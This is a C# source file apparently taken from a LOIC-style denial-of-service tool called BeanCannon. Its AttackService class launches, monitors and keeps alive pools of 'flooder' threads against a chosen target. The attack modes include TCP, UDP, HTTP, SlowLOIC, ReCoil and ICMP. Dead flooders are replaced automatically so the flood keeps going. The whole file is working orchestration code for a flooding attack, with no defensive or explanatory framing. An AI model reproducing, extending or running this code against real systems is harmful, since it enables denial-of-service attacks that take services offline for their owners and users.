using BeanCannon.BusinessLogic.Core.Attacks;
using BeanCannon.BusinessLogic.Core.Factory;
using BeanCannon.BusinessLogic.Core.Models;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;

namespace BeanCannon.BusinessLogic.Core.Services
{
	// TODO: Add Cleaning
	public enum AttackServiceStatus
	{
		Idle,
		InProgress
	}

	public class AttackService
	{
		private static readonly Object locker = new Object();

		public AttackServiceStatus Status = AttackServiceStatus.Idle;

		private AttackFactory attackFactory = new AttackFactory();
		private List<IFlooder> floodersList = new List<IFlooder>();

		private static AttackService _Instance;
		public static AttackService Instance
		{
			get
			{
				lock (locker)
				{
					if (null == _Instance)
					{
						_Instance = new AttackService();
					}

					return _Instance;
				}
			}
		}

		/// <summary>
		/// Attack the specified target.
		/// </summary>
		/// <param name="toggle">Whether to toggle.</param>
		/// <param name="on">Whether the attack should start.</param>
		/// <param name="silent">Whether to silence error output.</param>
		public void Attack(IApplicationSettings settings, bool toggle, bool on, bool silent = false)
		{
			if ((Status == AttackServiceStatus.Idle && toggle) || (!toggle && on))
			{
				try
				{
					// Protect against race condition
					//if (timerShowStats.Enabled) timerShowStats.Stop();

					/*
					if (!Functions.ParseInt(textPort.Text, 0, 65535, out settings._Port))
					{
						Wtf("I don't think ports are supposed to be written like THAT.", silent);
						return;
					}
					*/

					/*
					if (!Functions.ParseInt(textThreads.Text, 1, 99, out iThreads))
					{
						Wtf("What on earth made you put THAT in the threads field?", silent);
						return;
					}
					*/

					/*
					settings.Ip = textTarget.Text;
					if (String.IsNullOrEmpty(settings.Ip) || String.IsNullOrEmpty(settings.Host) || String.Equals(settings.Ip, "N O N E !"))
					{
						throw new Exception("Select a target.");
					}
					*/

					/*
					if (Enum.TryParse(comboBoxMethod.Text, true, out AttackProtocol protocol))
					{
						settings.Protocol = protocol;
					}
					else
					{
						Wtf("Select a proper attack method.", silent);
						return;
					}
					*/

					/*
					settings.StreamData = textData.Text.Replace(@"\r", "\r").Replace(@"\n", "\n");
					if (String.IsNullOrEmpty(settings.StreamData) && (settings.Protocol == AttackProtocol.TCP || settings.Protocol == AttackProtocol.UDP))
					{
						Wtf("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O", silent);
						return;
					}
					*/

					/*
					settings.UrlPath = textSubsite.Text;
					if (!settings.UrlPath.StartsWith("/") && (int)settings.Protocol >= (int)AttackProtocol.HTTP && (int)settings.Protocol != (int)AttackProtocol.ICMP)
					{
						Wtf("You have to enter a subsite (for example \"/\")", silent);
						return;
					}
					*/

					/*
					if (!int.TryParse(textTimeout.Text, out settings._Timeout) || settings._Timeout < 1)
					{
						Wtf("What's up with something like that in the timeout box? =S", silent);
						return;
					}
					*/

					/*
					if (settings._Timeout > 999)
					{
						settings._Timeout = 30;
						textTimeout.Text = "30";
					}
					*/

					/*
					settings.WaitReply = checkBoxWaitReply.Checked;
					*/

					/*
					if (settings.Protocol == AttackProtocol.SlowLOIC || settings.Protocol == AttackProtocol.ReCoil || settings.Protocol == AttackProtocol.ICMP)
					{
						if (!int.TryParse(textSocketsPerThread.Text, out settings._SocketsPerThread) || settings._SocketsPerThread < 1)
						{
							throw new Exception("A number is fine too!");
						}
					}
					*/
				}
				catch (Exception ex)
				{
					/*
					Wtf(ex.Message, silent);
					*/

					return;
				}

				/*
				buttonAttack.Text = StopFloodingText;
				//let's lock down the controls, that could actually change the creation of new sockets
				checkBoxAllowGzip.Enabled = false;
				checkBoxUseGet.Enabled = false;
				checkBoxUseRandomMessage.Enabled = false;
				checkBoxRandomPath.Enabled = false;
				comboBoxMethod.Enabled = false;
				checkBoxWaitReply.Enabled = false;
				textSocketsPerThread.Enabled = false;
				*/

				if (floodersList.Count > 0)
				{
					foreach (IFlooder flooder in floodersList)
					{
						flooder.Stop();
						flooder.State.IsFlooding = false;
					}

					floodersList.Clear();
				}

				for (int i = 0; i < settings.Threads; i++)
				{
					IFlooder flooder = attackFactory.Get(settings);

					if (flooder != null)
					{
						flooder.Start();
						floodersList.Add(flooder);
					}
				}

				/*
				timerShowStats.Start();
				*/

				Status = AttackServiceStatus.InProgress;
			}
			else if (toggle || !on)
			{
				/*
				buttonAttack.Text = AttackText;
				checkBoxAllowGzip.Enabled = true;
				checkBoxUseGet.Enabled = true;
				checkBoxUseRandomMessage.Enabled = true;
				checkBoxRandomPath.Enabled = true;
				comboBoxMethod.Enabled = true;
				checkBoxWaitReply.Enabled = true;
				textSocketsPerThread.Enabled = true;
				*/

				if (floodersList != null && floodersList.Count > 0)
				{
					foreach (IFlooder flooder in floodersList)
					{
						flooder.Stop();
						flooder.State.IsFlooding = false;
					}
				}

				Status = AttackServiceStatus.Idle;
			}
		}

		public ReadOnlyCollection<IFlooder> GetFlooders()
		{
			return floodersList.AsReadOnly();
		}

		bool intShowStats;

		/// <summary>
		/// Handles the tShowStats Tick event.
		/// </summary>
		public bool GetStatistics(IApplicationSettings settings, out AttackState attackState)
		{
			// TODO: Use lock

			// Protect against null reference and race condition
			if (floodersList == null || intShowStats)
			{
				attackState = null;
				return false;
			}

			intShowStats = true;

			attackState = new AttackState();

			bool isFlooding = false;

			if (Status == AttackServiceStatus.InProgress)
			{
				isFlooding = true;
			}

			if (floodersList.Count > 0)
			{
				for (int a = (floodersList.Count - 1); a >= 0; a--)
				{
					if (floodersList[a] != null && (floodersList[a] is BaseFlooder))
					{
						BaseFlooder flooder = (BaseFlooder)floodersList[a];

						attackState.Downloaded += flooder.State.Downloaded;
						attackState.Requested += flooder.State.Requested;
						attackState.Failed += flooder.State.Failed;

						if (flooder.State.Status == RequestStatus.Ready ||
							flooder.State.Status == RequestStatus.Completed)
						{
							attackState.Idle++;
						}

						if (flooder.State.Status == RequestStatus.Connecting)
						{
							attackState.Connecting++;
						}

						if (flooder.State.Status == RequestStatus.Requesting)
						{
							attackState.Requesting++;
						}

						if (flooder.State.Status == RequestStatus.Downloading)
						{
							attackState.Downloading++;
						}

						if (isFlooding && !flooder.State.IsFlooding)
						{
							int iaDownloaded = flooder.State.Downloaded;
							int iaRequested = flooder.State.Requested;
							int iaFailed = flooder.State.Failed;

							BaseFlooder newFlooder = attackFactory.Get(settings) as BaseFlooder;

							if (newFlooder != null)
							{
								floodersList[a].Stop();
								floodersList[a].State.IsFlooding = false;

								Logger.Log.InfoFormat(
									"Removing Flooder from index {0}",
									a
									);

								floodersList.RemoveAt(a);

								newFlooder.State.Downloaded = iaDownloaded;
								newFlooder.State.Requested = iaRequested;
								newFlooder.State.Failed = iaFailed;
								newFlooder.Start();

								floodersList.Add(newFlooder);
							}
						}
					}
				}

				if (isFlooding)
				{
					while (floodersList.Count < settings.Threads)
					{
						IFlooder ts = attackFactory.Get(settings);

						if (ts != null)
						{
							ts.Start();
							floodersList.Add(ts);
						}
						else
						{
							break;
						}
					}

					if (floodersList.Count > settings.Threads)
					{
						for (int a = (floodersList.Count - 1); a >= settings.Threads; a--)
						{
							floodersList[a].Stop();
							floodersList[a].State.IsFlooding = false;

							Logger.Log.InfoFormat(
								"Removing Flooder from index {0}",
								a
								);

							floodersList.RemoveAt(a);
						}
					}
				}
			}

			/*
			this.workersForm.UpdateWorkers(floodersList);
			*/

			/*
			labelAttackFailed.Text = iFailed.ToString();
			labelAttackRequested.Text = iRequested.ToString();
			labelAttackDownloaded.Text = iDownloaded.ToString();
			labelAttackDownloading.Text = iDownloading.ToString();
			labelAttackRequesting.Text = iRequesting.ToString();
			labelAttackConnecting.Text = iConnecting.ToString();
			labelAttackIdle.Text = iIdle.ToString();
			*/

			intShowStats = false;

			return true;
		}
	}
}
